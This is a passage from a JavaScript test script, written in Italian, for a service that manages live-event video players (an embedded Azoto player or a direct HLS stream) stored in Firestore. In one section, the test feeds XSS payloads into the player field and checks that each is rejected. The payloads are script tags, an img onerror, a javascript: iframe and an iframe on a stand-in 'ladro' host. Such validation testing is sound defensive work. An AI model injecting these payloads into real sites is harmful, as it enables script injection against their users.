        vero(JSON.stringify(D.campiVideo({}, {}, 'programmato')) === '{"tipoPlayer":"azoto"}', 'un documento di prima senza tipoPlayer: si scrive tipoPlayer \'azoto\' (il predefinito), niente altro');
        vero(Object.keys(D.campiVideo({ tipoPlayer: 'azoto' }, {}, 'programmato')).length === 0, 'un evento senza video fuori onda: nessuna scrittura');

        /* ---------- riservatiDa: un evento di prima con Azoto nel link principale ---------- */
        const diPrima = D.riservatiDa({ videoUrl: AZOTO, videoId: AZOTO, riservaUrl: '', riservaId: '' });
        vero(diPrima.tipoPlayer === 'azoto' && diPrima.azotoUrl === AZOTO && diPrima.videoId === '' && diPrima.videoUrl === '',
            'evento di prima (senza tipoPlayer) con il player di Azoto nel link principale: diventa il suo player Azoto');
        const diPrimaHls = D.riservatiDa({ videoUrl: HLS, videoId: HLS });
        vero(diPrimaHls.tipoPlayer === 'azoto' && diPrimaHls.azotoUrl === '' && diPrimaHls.videoId === HLS, 'evento di prima con un flusso: il flusso resta, la modalita\' e\' la predefinita (azoto)');
        vero(D.riservatiDa({ tipoPlayer: 'strano' }).tipoPlayer === 'azoto' && D.riservatiDa(null).tipoPlayer === 'azoto', 'tipoPlayer sconosciuto o assente: azoto');

        /* ---------- eventoJSON: i campi nuovi, e MAI la chiave ---------- */
        const j = D.eventoJSON('napoli-2026', { titolo: 'Napoli', tipoPlayer: 'flusso', videoId: HLS, videoRiserva: HLS_RISERVA, sorgente: 'riserva', videoFirmato: true }, risFlusso);
        vero(j.tipoPlayer === 'flusso' && j.azotoUrl === AZOTO && j.azotoInOnda === '' && j.videoInOnda === HLS, 'eventoJSON (flusso in onda): tipoPlayer, azotoUrl, azotoInOnda vuoto, videoInOnda il flusso');
        vero(j.riservaUrl === HLS_RISERVA && j.riservaId === HLS_RISERVA && j.riservaInOnda === HLS_RISERVA && j.sorgente === 'riserva' && j.videoFirmato === true,
            'eventoJSON: riservaUrl, riservaId, riservaInOnda, sorgente, videoFirmato');
        vero(j.videoTipo === 'hls' && j.riservaTipo === 'hls', 'eventoJSON: il tipo dei due link');
        vero(j.firma && j.firma.schema === 'nginx' && j.firma.durataOre === 6 && j.firma.segretoImpostato === true && !('segreto' in j.firma),
            'eventoJSON: la firma senza la chiave (segretoImpostato: true) ' + JSON.stringify(j.firma));
        vero(JSON.stringify(j).indexOf('chiave-segreta-di-prova') < 0, 'eventoJSON: la chiave segreta non compare da nessuna parte');
        const jA = D.eventoJSON('napoli-2026', { titolo: 'Napoli', tipoPlayer: 'azoto', videoId: AZOTO, videoRiserva: '', videoFirmato: false }, risAzoto);
        vero(jA.tipoPlayer === 'azoto' && jA.azotoUrl === AZOTO && jA.azotoInOnda === AZOTO && jA.videoInOnda === AZOTO && jA.videoId === HLS,
            'eventoJSON (Azoto in onda): azotoInOnda = videoInOnda = l\'indirizzo pubblico; il flusso salvato resta in videoId');
        const jVecchio = D.eventoJSON('napoli-2026', { titolo: 'Napoli', videoId: AZOTO }, { videoUrl: AZOTO, videoId: AZOTO });
        vero(jVecchio.tipoPlayer === 'azoto' && jVecchio.azotoUrl === AZOTO && jVecchio.azotoInOnda === AZOTO && jVecchio.videoId === '',
            'eventoJSON di un evento di prima con Azoto nel link principale: si vede come player Azoto');
        const vuoto = D.eventoJSON('x-2026', { titolo: 'X' }, {});
        vero(vuoto.tipoPlayer === 'azoto' && vuoto.azotoUrl === '' && vuoto.azotoInOnda === '' && vuoto.sorgente === 'principale' && vuoto.videoFirmato === false
            && vuoto.riservaUrl === '' && vuoto.firma.schema === 'nessuna' && vuoto.firma.segretoImpostato === false,
        'eventoJSON di un evento di prima (senza i campi nuovi): valori predefiniti');

        /* ---------- evento-salva sul Firestore in memoria ---------- */
        const mem = memoria();
        const pub = () => mem.dati['eventi/roma-2026'];
        const ris = () => mem.dati['eventiRiservati/roma-2026'];
        let js = await D.salvaEvento(mem.ctx, Object.assign({ nuovo: true }, EVENTO));
        vero(pub() && pub().tipoPlayer === 'azoto' && pub().videoId === '' && pub().videoRiserva === '' && pub().videoFirmato === false && pub().stato === 'programmato',
            'evento-salva, evento nuovo: tipoPlayer \'azoto\' nel documento pubblico (il predefinito), nessun video');
        vero(ris().tipoPlayer === 'azoto' && ris().azotoUrl === '' && js.tipoPlayer === 'azoto' && js.azotoUrl === '', 'evento nuovo: nel documento riservato tipoPlayer \'azoto\' e nessun indirizzo');
        mem.ora = 2000;
        js = await D.salvaEvento(mem.ctx, Object.assign({}, EVENTO, { azotoUrl: CODICE_AZOTO }));
        vero(ris().azotoUrl === AZOTO && js.azotoUrl === AZOTO && pub().videoId === '', 'evento-salva con il codice di Azoto: si salva solo l\'indirizzo; fuori onda niente nel documento pubblico');
        vero(!/[<>]|script|iframe|azoto-player\.js/.test(JSON.stringify(mem.dati)), 'nessun pezzo del codice incollato (tag, script) in Firestore');
        js = await D.salvaEvento(mem.ctx, Object.assign({}, EVENTO, { azotoUrl: AZOTO_30 }));
        vero(ris().azotoUrl === AZOTO_30 && js.azotoUrl === AZOTO_30, 'evento-salva con l\'indirizzo: si salva');
        const scrittePrima = mem.scritture.length;
        for (const [campo, valore, motivo] of [
            ['azotoUrl', "<iframe src='https://ladro.example.com/player'></iframe><script>alert(1)</script>", /cdn\.azotosolutions\.com/],
            ['azotoUrl', "<script>alert(1)</script><iframe src='javascript:alert(1)'></iframe>", /Non riconosco/],
            ['azotoUrl', '<img src=x onerror=alert(1)>', /non trovo l'indirizzo del player/],
            ['azotoUrl', HLS, /va nel campo «Flusso diretto \(\.m3u8\)»/],
            ['videoUrl', AZOTO, /va nel campo «Player Azoto»/],
            ['videoUrl', CODICE_AZOTO, /va nel campo «Player Azoto»/],
            ['riservaUrl', AZOTO, /va nel campo «Player Azoto»/]
        ]) {
            const x = await errore(() => D.salvaEvento(mem.ctx, Object.assign({}, EVENTO, { [campo]: valore })));
            const atteso = campo === 'azotoUrl' ? 'azoto' : 'video';
            vero(x && x.stato === 400 && x.codice === atteso && motivo.test(x.message),
                'evento-salva con ' + campo + ' = ' + JSON.stringify(valore).slice(0, 60) + ': 400 campo ' + atteso + ' («' + (x && x.message) + '»)');
        }
        vero(mem.scritture.length === scrittePrima && ris().azotoUrl === AZOTO_30, 'dopo i rifiuti niente scritto: resta l\'indirizzo di prima');
        const senzaFlusso = await errore(() => D.salvaEvento(mem.ctx, Object.assign({}, EVENTO, { tipoPlayer: 'flusso' })));
        vero(senzaFlusso && senzaFlusso.stato === 400 && senzaFlusso.codice === 'tipoPlayer' && /^Per il flusso diretto serve prima il link \.m3u8/.test(senzaFlusso.message),
            'evento-salva: tipoPlayer \'flusso\' senza il flusso principale -> 400 campo tipoPlayer («' + (senzaFlusso && senzaFlusso.message) + '»)');
        const strano = await errore(() => D.salvaEvento(mem.ctx, Object.assign({}, EVENTO, { tipoPlayer: 'iframe' })));
        vero(strano && strano.stato === 400 && strano.codice === 'tipoPlayer', 'evento-salva: tipoPlayer sconosciuto -> 400');
        js = await D.salvaEvento(mem.ctx, Object.assign({}, EVENTO, { tipoPlayer: 'azoto', azotoUrl: '' }));
        vero(js.tipoPlayer === 'azoto' && js.azotoUrl === '' && ris().azotoUrl === '', 'evento-salva: player Azoto senza indirizzo si salva (lo si inserisce piu\' tardi)');
        js = await D.salvaEvento(mem.ctx, Object.assign({}, EVENTO, { tipoPlayer: 'flusso', videoUrl: HLS, riservaUrl: HLS_RISERVA, azotoUrl: CODICE_AZOTO }));
        vero(js.tipoPlayer === 'flusso' && ris().tipoPlayer === 'flusso' && pub().tipoPlayer === 'flusso' && js.videoId === HLS && js.azotoUrl === AZOTO && pub().videoId === '',
            'evento-salva: flusso diretto con il suo link (e l\'indirizzo di Azoto pronto); tipoPlayer nel documento pubblico anche fuori onda');
        const togliFlusso = await errore(() => D.salvaEvento(mem.ctx, Object.assign({}, EVENTO, { videoUrl: '', riservaUrl: '' })));
        vero(togliFlusso && togliFlusso.stato === 400 && togliFlusso.codice === 'video' && ris().videoId === HLS, 'evento-salva: togliere il flusso mentre e\' la modalita\' scelta -> 400, e il flusso resta');
        mem.ora = 3000;
        js = await D.salvaEvento(mem.ctx, Object.assign({}, EVENTO, { tipoPlayer: 'azoto' }));
        vero(js.tipoPlayer === 'azoto' && pub().tipoPlayer === 'azoto' && pub().videoAggiornato.toMillis() === 3000 && js.videoId === HLS,
            'evento-salva: di nuovo Azoto (il flusso resta salvato per dopo); videoAggiornato cambia con tipoPlayer');
        const primaDiNiente = mem.scritture.length;
        mem.ora = 3500;
        await D.salvaEvento(mem.ctx, Object.assign({}, EVENTO));
        vero(mem.scritture.length === primaDiNiente, 'evento-salva senza cambiamenti: nessuna scrittura');

        /* ---------- evento-stato ed evento-video con Azoto ---------- */
        mem.ora = 4000;
        js = await D.cambiaStato(mem.ctx, { idEvento: 'roma-2026', stato: 'in_onda' });
        vero(pub().videoId === AZOTO && pub().videoRiserva === '' && pub().videoFirmato === false && js.azotoInOnda === AZOTO,
            'in onda con Azoto: nel documento pubblico l\'indirizzo del player, niente riserva ne\' firma');
        mem.ora = 5000;
        js = await D.cambiaVideo(mem.ctx, { idEvento: 'roma-2026', azotoUrl: "<iframe src='" + AZOTO_30 + "'></iframe>" });
        vero(pub().videoId === AZOTO_30 && pub().videoAggiornato.toMillis() === 5000 && ris().azotoUrl === AZOTO_30 && ris().videoId === HLS && js.azotoInOnda === AZOTO_30,
            'evento-video con azotoUrl in onda: tutti passano al nuovo player (videoAggiornato), il flusso salvato resta');
        const cattivo = await errore(() => D.cambiaVideo(mem.ctx, { idEvento: 'roma-2026', azotoUrl: 'https://ladro.example.com/player' }));
        vero(cattivo && cattivo.stato === 400 && cattivo.codice === 'azoto' && pub().videoId === AZOTO_30, 'evento-video con un indirizzo non di Azoto: 400, e resta quello di prima');
        mem.ora = 5500;
        await D.cambiaVideo(mem.ctx, { idEvento: 'roma-2026', videoUrl: 'https://webtv.esempio.it/live/napoli-bis/playlist.m3u8' });
        vero(ris().videoId === 'https://webtv.esempio.it/live/napoli-bis/playlist.m3u8' && ris().azotoUrl === AZOTO_30 && pub().videoId === AZOTO_30 && pub().videoAggiornato.toMillis() === 5000,
            'evento-video con il flusso mentre si usa Azoto: il flusso cambia nel documento riservato, chi guarda non se ne accorge');
        await D.cambiaVideo(mem.ctx, { idEvento: 'roma-2026', videoUrl: HLS });

        /* ---------- evento-player: A -> B -> A in onda, la riconferma, B senza flusso ---------- */
        mem.ora = 6000;
        js = await D.cambiaPlayer(mem.ctx, { idEvento: 'roma-2026', tipoPlayer: 'flusso' });
        vero(pub().tipoPlayer === 'flusso' && pub().videoId === HLS && pub().videoRiserva === HLS_RISERVA && pub().videoAggiornato.toMillis() === 6000 && js.tipoPlayer === 'flusso' && ris().tipoPlayer === 'flusso',
            'evento-player A -> B in onda: tutti passano al flusso diretto (videoId = flusso, videoRiserva, videoAggiornato)');
        mem.ora = 7000;
        js = await D.cambiaPlayer(mem.ctx, { idEvento: 'roma-2026', tipoPlayer: 'azoto' });
        vero(pub().tipoPlayer === 'azoto' && pub().videoId === AZOTO_30 && pub().videoRiserva === '' && pub().videoFirmato === false && pub().videoAggiornato.toMillis() === 7000 && js.tipoPlayer === 'azoto',
            'evento-player B -> A in onda: tutti tornano al player Azoto (niente riserva ne\' firma)');
        const scritturePub = mem.scritture.filter(w => w === 'eventi/roma-2026').length;
        mem.ora = 8000;
        await D.cambiaPlayer(mem.ctx, { idEvento: 'roma-2026', tipoPlayer: 'azoto' });
        vero(pub().tipoPlayer === 'azoto' && pub().videoAggiornato.toMillis() === 8000 && mem.scritture.filter(w => w === 'eventi/roma-2026').length === scritturePub + 1,
            'evento-player con la modalita\' gia\' in uso (riconferma): aggiorna videoAggiornato (una scrittura), riporta tutti');
        const strano2 = await errore(() => D.cambiaPlayer(mem.ctx, { idEvento: 'roma-2026', tipoPlayer: 'altro' }));
        vero(strano2 && strano2.stato === 400 && strano2.codice === 'tipoPlayer', 'evento-player con una modalita\' sconosciuta: 400');
        const assente = await errore(() => D.cambiaPlayer(mem.ctx, { idEvento: 'milano-2099', tipoPlayer: 'azoto' }));
        vero(assente && assente.stato === 404, 'evento-player di un evento che non c\'e\': 404');

        const mem2 = memoria();
        const pub2 = () => mem2.dati['eventi/solo-azoto'];
        await D.salvaEvento(mem2.ctx, Object.assign({ nuovo: true }, EVENTO, { id: 'solo-azoto', azotoUrl: AZOTO }));
        await D.cambiaStato(mem2.ctx, { idEvento: 'solo-azoto', stato: 'in_onda' });
        mem2.ora = 9000;
        const bSenza = await errore(() => D.cambiaPlayer(mem2.ctx, { idEvento: 'solo-azoto', tipoPlayer: 'flusso' }));
        vero(bSenza && bSenza.stato === 400 && bSenza.codice === 'tipoPlayer' && /^Per il flusso diretto serve prima il link \.m3u8/.test(bSenza.message)
            && pub2().tipoPlayer === 'azoto' && pub2().videoId === AZOTO && pub2().videoAggiornato.toMillis() === 1000,
        'evento-player B senza il flusso: 400 («' + (bSenza && bSenza.message) + '»), e tutto resta com\'era');
        await D.cambiaVideo(mem2.ctx, { idEvento: 'solo-azoto', azotoUrl: '' });
        const aSenza = await errore(() => D.cambiaPlayer(mem2.ctx, { idEvento: 'solo-azoto', tipoPlayer: 'azoto' }));
        vero(aSenza && aSenza.stato === 400 && aSenza.codice === 'tipoPlayer' && /player Azoto/.test(aSenza.message), 'evento-player A senza l\'indirizzo di Azoto: 400 («' + (aSenza && aSenza.message) + '»)');
        const linkSenza = await errore(() => D.linkVideo(mem2.ctx, { idEvento: 'solo-azoto', sorgente: 'principale', soloInOnda: true }));
        vero(linkSenza && linkSenza.stato === 409 && linkSenza.codice === 'non-flusso', 'link-video in modalita\' Azoto: 409 non-flusso');

        /* ---------- link-video / link-firmato: solo per il flusso ---------- */
        const lvAzoto = await errore(() => D.linkVideo(mem.ctx, { idEvento: 'roma-2026', sorgente: 'principale', soloInOnda: true }));
        const lfAzoto = await errore(() => D.linkVideo(mem.ctx, { idEvento: 'roma-2026', sorgente: 'riserva', soloInOnda: false }));
        vero(lvAzoto && lvAzoto.stato === 409 && lvAzoto.codice === 'non-flusso' && lvAzoto.pubblico === true && lfAzoto && lfAzoto.stato === 409 && lfAzoto.codice === 'non-flusso',
            'link-video e link-firmato con il player Azoto: 409 non-flusso («' + (lvAzoto && lvAzoto.message) + '»)');
        await D.cambiaPlayer(mem.ctx, { idEvento: 'roma-2026', tipoPlayer: 'flusso' });
        const lv = await D.linkVideo(mem.ctx, { idEvento: 'roma-2026', sorgente: 'riserva', soloInOnda: true });
        vero(lv.url === HLS_RISERVA && lv.scade === null, 'link-video con il flusso diretto: il link (senza firma, com\'e\')');

        /* ---------- evento-sorgente (con il flusso diretto) ---------- */
        mem.ora = 10000;
        js = await D.cambiaSorgente(mem.ctx, { idEvento: 'roma-2026', sorgente: 'riserva' });
        vero(pub().sorgente === 'riserva' && pub().videoAggiornato.toMillis() === 10000 && js.sorgente === 'riserva',
            'evento-sorgente: la regia passa alla riserva per tutti (sorgente e videoAggiornato)');
        mem.ora = 11000;
        await D.cambiaSorgente(mem.ctx, { idEvento: 'roma-2026', sorgente: 'riserva' });
        vero(pub().sorgente === 'riserva' && pub().videoAggiornato.toMillis() === 11000, 'evento-sorgente: la stessa scelta ripetuta (riserva) aggiorna comunque videoAggiornato');
        mem.ora = 12000;
        await D.cambiaSorgente(mem.ctx, { idEvento: 'roma-2026', sorgente: 'principale' });
        mem.ora = 13000;
        const primaSorgente = mem.scritture.filter(w => w === 'eventi/roma-2026').length;
        js = await D.cambiaSorgente(mem.ctx, { idEvento: 'roma-2026', sorgente: 'principale' });
        vero(pub().sorgente === 'principale' && pub().videoAggiornato.toMillis() === 13000 && js.sorgente === 'principale' && mem.scritture.filter(w => w === 'eventi/roma-2026').length === primaSorgente + 1,
            'evento-sorgente: «Torna al link principale per tutti» con la regia gia\' sul principale aggiorna videoAggiornato (riporta chi era passato da solo alla riserva)');
        const togliInUso = await errore(() => D.cambiaVideo(mem.ctx, { idEvento: 'roma-2026', videoUrl: '' }));
        vero(togliInUso && togliInUso.stato === 400 && togliInUso.codice === 'video' && pub().videoId === HLS, 'evento-video: il flusso in uso per tutti non si toglie (prima si torna ad Azoto)');
        await D.cambiaVideo(mem.ctx, { idEvento: 'roma-2026', riservaUrl: '' });
        const senzaRis = await errore(() => D.cambiaSorgente(mem.ctx, { idEvento: 'roma-2026', sorgente: 'riserva' }));
        vero(senzaRis && senzaRis.stato === 400 && /Non c'è un link di riserva/.test(senzaRis.message) && pub().videoRiserva === '', 'evento-sorgente: la riserva senza riserva -> 400');
        const sorgenteStrana = await errore(() => D.cambiaSorgente(mem.ctx, { idEvento: 'roma-2026', sorgente: 'altro' }));
        vero(sorgenteStrana && sorgenteStrana.stato === 400, 'evento-sorgente: una scelta che non e\' principale/riserva -> 400');

        /* ---------- uscendo dall'onda, e un evento di prima ---------- */
        await D.cambiaStato(mem.ctx, { idEvento: 'roma-2026', stato: 'terminato' });
        vero(pub().videoId === '' && pub().videoRiserva === '' && pub().videoFirmato === false && pub().tipoPlayer === 'flusso', 'terminato: nessun indirizzo nel documento pubblico (tipoPlayer resta)');
        const mem3 = memoria({
            'eventi/vecchio-2026': { titolo: 'Vecchio', stato: 'programmato', videoId: '', videoRiserva: '', sorgente: 'principale', videoFirmato: false, videoAggiornato: ts(1) },
            'eventiRiservati/vecchio-2026': { videoUrl: AZOTO, videoId: AZOTO, riservaUrl: '', riservaId: '', firma: { schema: 'nessuna' } }
        });
        await D.cambiaStato(mem3.ctx, { idEvento: 'vecchio-2026', stato: 'in_onda' });
        const v3 = mem3.dati['eventi/vecchio-2026'];
        vero(v3.tipoPlayer === 'azoto' && v3.videoId === AZOTO, 'un evento di prima con il player di Azoto nel link principale: in onda lo mostra come player Azoto');
    } catch (e) {
        rossi++;
        console.log('ROSSO  prova del servizio interrotta: ' + (e && e.stack ? e.stack.split('\n').slice(0, 3).join(' | ') : e));
    }
    console.log('\n' + verdi + ' verdi, ' + rossi + ' rossi');
    process.exit(rossi ? 1 : 0);
})();
